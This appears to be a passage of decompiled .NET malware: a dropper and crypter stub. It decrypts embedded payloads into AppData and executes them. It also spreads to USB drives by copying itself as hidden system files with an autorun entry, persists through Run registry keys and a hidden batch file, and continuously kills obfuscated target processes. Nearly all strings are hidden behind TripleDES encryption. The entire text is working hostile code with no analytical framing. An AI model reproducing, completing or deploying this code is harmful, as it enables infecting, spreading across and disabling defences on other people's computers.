				string[] array6 = Strings.Split(Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("Ev")), Conversions.ToString(resourceManager.GetObject("KK")))), TripleDES("XzVTq4ALkFG7nFQCZ7DbP3DFeXpcWzhi", "SnKw3DlQUMW", d: true), -1, (CompareMethod)0);
				string text20 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Number(10000, 99999) + array6[1];
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text20, Encoding.Default.GetBytes(array6[0]), false);
				if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BSU"), (object)text2, false))
				{
					Process.Start(text20);
				}
				else if (Operators.CompareString(Application.get_ExecutablePath(), text19 + "\\" + Path.GetFileName(Application.get_ExecutablePath()), false) != 0)
				{
					Process.Start(text20);
				}
				array6 = Strings.Split(Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("Ev1")), Conversions.ToString(resourceManager.GetObject("KK")))), TripleDES("XzVTq4ALkFG7nFQCZ7DbP3DFeXpcWzhi", "SnKw3DlQUMW", d: true), -1, (CompareMethod)0);
				string text21 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Number(10000, 99999) + array6[1];
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text21, Encoding.Default.GetBytes(array6[0]), false);
				if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BSU"), (object)text2, false))
				{
					Process.Start(text20);
				}
				else if (Operators.CompareString(Application.get_ExecutablePath(), text19 + "\\" + Path.GetFileName(Application.get_ExecutablePath()), false) != 0)
				{
					Process.Start(text21);
				}
				array6 = Strings.Split(Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("Ev2")), Conversions.ToString(resourceManager.GetObject("KK")))), TripleDES("XzVTq4ALkFG7nFQCZ7DbP3DFeXpcWzhi", "SnKw3DlQUMW", d: true), -1, (CompareMethod)0);
				string text22 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Number(10000, 99999) + array6[1];
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text22, Encoding.Default.GetBytes(array6[0]), false);
				if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BSU"), (object)text2, false))
				{
					Process.Start(text20);
				}
				else if (Operators.CompareString(Application.get_ExecutablePath(), text19 + "\\" + Path.GetFileName(Application.get_ExecutablePath()), false) != 0)
				{
					Process.Start(text22);
				}
				array6 = Strings.Split(Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("Ev3")), Conversions.ToString(resourceManager.GetObject("KK")))), TripleDES("XzVTq4ALkFG7nFQCZ7DbP3DFeXpcWzhi", "SnKw3DlQUMW", d: true), -1, (CompareMethod)0);
				string text23 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Number(10000, 99999) + array6[1];
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text23, Encoding.Default.GetBytes(array6[0]), false);
				if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BSU"), (object)text2, false))
				{
					Process.Start(text20);
				}
				else if (Operators.CompareString(Application.get_ExecutablePath(), text19 + "\\" + Path.GetFileName(Application.get_ExecutablePath()), false) != 0)
				{
					Process.Start(text23);
				}
				array6 = Strings.Split(Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("Ev4")), Conversions.ToString(resourceManager.GetObject("KK")))), TripleDES("XzVTq4ALkFG7nFQCZ7DbP3DFeXpcWzhi", "SnKw3DlQUMW", d: true), -1, (CompareMethod)0);
				string text24 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Number(10000, 99999) + array6[1];
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text24, Encoding.Default.GetBytes(array6[0]), false);
				if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BSU"), (object)text2, false))
				{
					Process.Start(text20);
				}
				else if (Operators.CompareString(Application.get_ExecutablePath(), text19 + "\\" + Path.GetFileName(Application.get_ExecutablePath()), false) != 0)
				{
					Process.Start(text24);
				}
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static string Number(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max).ToString();
	}

	public static void A(string ProcessName)
	{
		Process.GetProcesses();
		if (Process.GetProcessesByName(ProcessName).Length >= 1)
		{
			Thread.Sleep(10000);
		}
	}

	public static string xEncryption(string CodeKey, string DataIn)
	{
		string text = "";
		checked
		{
			long num = (long)Math.Round((double)Strings.Len(DataIn) / 2.0);
			for (long num2 = 1L; num2 <= num; num2++)
			{
				int num3 = (int)Math.Round(Conversion.Val("&H" + Strings.Mid(DataIn, (int)(2L * num2 - 1L), 2)));
				int num4 = Strings.Asc(Strings.Mid(CodeKey, (int)(unchecked(num2 % Strings.Len(CodeKey)) + 1L), 1));
				text += Conversions.ToString(Strings.Chr(num3 ^ num4));
			}
			return text;
		}
	}

	public static void USB()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		string text = "SELECT * FROM __InstanceOperationEvent WITHIN 10 WHERE TargetInstance ISA \"Win32_DiskDrive\"";
		a1 = new ManagementEventWatcher(text);
		a1.Start();
	}

	private static void Arrived(object sender, EventArrivedEventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		ManagementBaseObject newEvent = e.get_NewEvent();
		ManagementBaseObject val = (ManagementBaseObject)newEvent.get_Item(TripleDES("BeECyZDhMqH1NtU8ZOdMFA==", "SmuzjMgmQFl", d: true));
		string className = newEvent.get_ClassPath().get_ClassName();
		if (Operators.CompareString(className, TripleDES("Uo+NfKNUcoKviUbyHEc/mc0fmxMuZe+A", "S0DaArU4Ykg", d: true), false) == 0 && Operators.ConditionalCompareObjectEqual(val.get_Item(TripleDES("GXGp/r6ZOIFpA4iL7kDgFA==", "Sajxl93KTip", d: true)), (object)TripleDES("OSSIBTFcUnw=", "SbZWXuBIXIm", d: true), false))
		{
			a2 = GetDriveLetterFromDisk(Conversions.ToString(val.get_Item(TripleDES("0lKsecJPRRQ=", "SwzwNlAj9rd", d: true))));
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), a2 + TripleDES("i+B8YrYvyt0Sq5BN6HR4lherT1YP+WwbJ8M8/KUtwzg=", "SmwJvGAJdHm", d: true));
				FileSystem.FileOpen(1, a2 + TripleDES("bOg3a2XxVcb+smgDTKIFUA==", "S8601zX0qkR", d: true), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.FilePut(1, TripleDES("6PRe5IMBDiEDcBwcqBGYwQ==", "SbvQggsyIts", d: true) + "\r\n" + TripleDES("WCB7zGTUwHq251hIr0cjQAbgcRa2h8HuN2UCjwmLR9p9mt0RBCeowlr9558ZuprT", "SYtxy1zSOz7", d: true), -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(a2 + TripleDES("i+B8YrYvyt0Sq5BN6HR4lherT1YP+WwbJ8M8/KUtwzg=", "SmwJvGAJdHm", d: true)).Attributes = FileAttributes.Hidden | FileAttributes.System;
				((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(a2 + TripleDES("bOg3a2XxVcb+smgDTKIFUA==", "S8601zX0qkR", d: true)).Attributes = FileAttributes.Hidden | FileAttributes.System;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static string GetDriveLetterFromDisk(string Name)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ea: Expected O, but got Unknown
		string text = null;
		Name = Strings.Replace(Name, "\\", "\\\\", 1, -1, (CompareMethod)0);
		ObjectQuery val = new ObjectQuery(TripleDES("otRNHRZQtspEK343rCFWTKcfKPHnQUDYoQNRdRUD2LJW71/XzQ/3p/gFJBKTgB/a", "SOFnKUC5rP4", d: true) + "\"\"" + Name + "\"} WHERE AssocClass = Win32_DiskDriveToDiskPartition");
		ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = val2.Get().GetEnumerator();
			ManagementObjectEnumerator enumerator2 = default(ManagementObjectEnumerator);
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				ObjectQuery val4 = new ObjectQuery(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(TripleDES("jCkj2rjPZpS5O+3X6gt/YI42GgoXMUBrol934oslnZVmCn00WMgIzUgZpIpKs6mM", "SX2fHzeBREz", d: true) + "\"", "\""), ((ManagementBaseObject)val3).get_Item(TripleDES("C2hTirI/SXjM8+jWUP59yw==", "S70KGMflrbj", d: true))), (object)'"'), (object)"} WHERE AssocClass = Win32_LogicalDiskToPartition")));
				ManagementObjectSearcher val5 = new ManagementObjectSearcher(val4);
				try
				{
					enumerator2 = val5.Get().GetEnumerator();
					while (enumerator2.MoveNext())
					{
						ManagementObject val6 = (ManagementObject)enumerator2.get_Current();
						text = Conversions.ToString(Operators.ConcatenateObject((object)text, Operators.ConcatenateObject(((ManagementBaseObject)val6).get_Item(TripleDES("0lKsecJPRRQ=", "SwzwNlAj9rd", d: true)), (object)",")));
					}
				}
				finally
				{
					((IDisposable)enumerator2)?.Dispose();
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return text.Trim(new char[1] { ',' });
	}

	public static void Netframe()
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(TripleDES("73OEgg0n427dvkj7Mm+GF44BEV5VXpnyxjZHh6a6yuM2EED/rPSUVUyO6+R2UAaFpvaTZ1Rc8VIEE3IxHke8OO+JssKRRew77c7VCmNbHfX1ZnjOQDTYIo/TncQZlD7ywTDeSVae0bI=", "SKu5VJATkdp", d: true), TripleDES("ANLVJY+kWJPQ6pyR9FuDXwxUgbsmjx6u", "SV7vQXcXDmL", d: true) + Path.GetFileName(Application.get_ExecutablePath()), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	public static void AStartUp(string Program, string Location)
	{
		try
		{
			string text = Location + "\\" + Path.GetFileName(Program);
			if (!File.Exists(text))
			{
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + TripleDES("Uxkdl+vv/Z0=", "SKYcdItzFTB", d: true);
				StreamWriter streamWriter = new StreamWriter(text2);
				streamWriter.WriteLine(TripleDES("g4pLtlHi5wkui7yMtneF9g==", "S57OaP8a8es", d: true) + Environment.NewLine);
				streamWriter.WriteLine(TripleDES("mzpLmUu0/U0=", "StezJVJOYzX", d: true) + Program + " " + text);
				streamWriter.Flush();
				streamWriter.Close();
				Process process = new Process();
				process.StartInfo.FileName = text2;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				process.WaitForExit();
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(TripleDES("3b7CXI+PReCrpf0F0gE2T4EVPxTQqIM7NDjs1xKudVpD0tB2oQvx5s+ScZM4CrFn", "SSQTlVep7Yn", d: true), writable: true)!.SetValue(Path.GetFileName(Program), text);
				((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey(TripleDES("3b7CXI+PReCrpf0F0gE2T4EVPxTQqIM7NDjs1xKudVpD0tB2oQvx5s+ScZM4CrFn", "SSQTlVep7Yn", d: true), writable: true)!.SetValue(Path.GetFileName(Program), text);
			}
			Thread.Sleep(1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string Killer(string proc)
	{
		try
		{
			while (true)
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (proc.Contains(process.ProcessName))
					{
						process.Kill();
					}
				}
				Thread.Sleep(1);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return null;
	}

	public static void F13()
	{
		Killer(TripleDES("iW731ZX3bWhJkL7Ng8C7+Q==", "Slo6ppSPVVt", d: true));
	}

	public static void F14()
	{
		Killer(TripleDES("jm1b5p2Bmb4=", "SZS4nwIwmJN", d: true));
	}

	public static void F15()
	{
		Killer(TripleDES("X2E5EvX/7tI=", "SidNZNAlE9V", d: true));
	}

	public static void F16()
	{
		Killer(TripleDES("FxSfgeeov84=", "SxEHPcO4vhA", d: true));
	}

	public static void F17()
	{
		Killer(TripleDES("9t65RZKVQ+L5K4k3McSBjg==", "SVwzUBSFkrf", d: true));
	}

	public static void F19()
	{
		Killer(TripleDES("BgKpNPBoYIk=", "S9rMt1tXkse", d: true));
	}

	public static void F21()
	{
		Killer(TripleDES("olSYe2N4Qq4=", "SECLbtiuVM8", d: true));
	}

	public static void F22()
	{
		Killer(TripleDES("7NOcx4w4fF5alSKW40SPvA==", "SZILl4tLLVS", d: true));
	}

	public static void F23()
	{
		Killer(TripleDES("2oBqzW7m25g=", "SQVpIFJrzv9", d: true));
	}

	public static void F24()
	{
		Killer(TripleDES("JHJX3Oef9yo=", "SGKCbxiOjmx", d: true));
	}

	public static void F25()
	{
		Killer(TripleDES("c5BsiuJmHUg=", "SfMRBAuRnc3", d: true));
	}

	public static void F26()
	{
		Killer(TripleDES("CEQuh4hL/Ho=", "ScCTUYmD2Zz", d: true));
	}

	public static void F27()
	{
		Killer(TripleDES("hU/dyuFkn9w38prv3jfPDA==", "SCvpYHHMfSp", d: true));
		Killer(TripleDES("Vj50lF6RIr0qQHc0qci9MA==", "Sdr8uOwwunn", d: true));
	}

	public static void F59()
	{
		Killer(TripleDES("ig9mBBaeG/o=", "SAMoQKLecjp", d: true));
	}

	public static void F60()
	{
		Killer(TripleDES("i7YN07OYl7I=", "SyKrZ4Gyapk", d: true));
	}

	public static void F61()
	{
		Killer(TripleDES("CUSdRchztuoAroR5rGzXDA==", "SN9to3iJLLR", d: true));
	}

	public static void F62()
	{
		Killer(TripleDES("pRZ4L4P5sbw=", "Sy4UfNSaAyr", d: true));
	}

	public static void F63()
	{
		Killer(TripleDES("V/qll3EOgvQ=", "S1gyZqQyZAZ", d: true));
	}

	public static byte[] Rc4(byte[] bytes, byte[] key)
	{
		byte[] array = new byte[256];
		checked
		{
			int num = array.Length - 1;
			int i;
			for (i = 0; i <= num; i++)
			{
				array[i] = (byte)i;
			}
			int num2 = array.Length - 1;
			int num3 = default(int);
			for (i = 0; i <= num2; i++)
			{
				num3 = (num3 + unchecked((int)key[i % key.Length]) + unchecked((int)array[i])) & 0xFF;
				byte b = array[i];
				array[i] = array[num3];
				array[num3] = b;
			}
			i = 0;
			num3 = 0;
			byte[] array2 = new byte[bytes.Length - 1 + 1];
			int num4 = bytes.Length - 1;
			for (int j = 0; j <= num4; j++)
			{
				i = (i + 1) & 0xFF;
				num3 = (num3 + unchecked((int)array[i])) & 0xFF;
				byte b2 = array[i];
				array[i] = array[num3];
				array[num3] = b2;
				unchecked
				{
					array2[j] = (byte)(array[checked(unchecked((int)array[i]) + unchecked((int)array[num3])) & 0xFF] ^ bytes[j]);
				}
			}
			return array2;
		}
	}

	public static string TripleDES(string b, string c, bool d)
	{
		byte[] array = Convert.FromBase64String(b);
		byte[] array2;
		if (d)
		{
			object obj = new MD5CryptoServiceProvider();
			array2 = (byte[])NewLateBinding.LateGet(obj, (Type)null, "ComputeHash", new object[1] { Encoding.UTF8.GetBytes(c) }, (string[])null, (Type[])null, (bool[])null);
		}
		else
		{
			array2 = Encoding.UTF8.GetBytes(c);
		}
		object obj2 = new TripleDESCryptoServiceProvider();
		NewLateBinding.LateSet(obj2, (Type)null, "Key", new object[1] { array2 }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj2, (Type)null, "Mode", new object[1] { CipherMode.ECB }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj2, (Type)null, "Padding", new object[1] { PaddingMode.PKCS7 }, (string[])null, (Type[])null);
		ICryptoTransform cryptoTransform = (ICryptoTransform)NewLateBinding.LateGet(obj2, (Type)null, "CreateDecryptor", new object[0], (string[])null, (Type[])null, (bool[])null);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		return Encoding.UTF8.GetString(bytes);
	}

	public static object Rijndael(string Decrypt, string Key)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Key, salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		try
		{
			byte[] array = Convert.FromBase64String(Decrypt);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			Decrypt = Encoding.UTF8.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return Decrypt;
	}
}
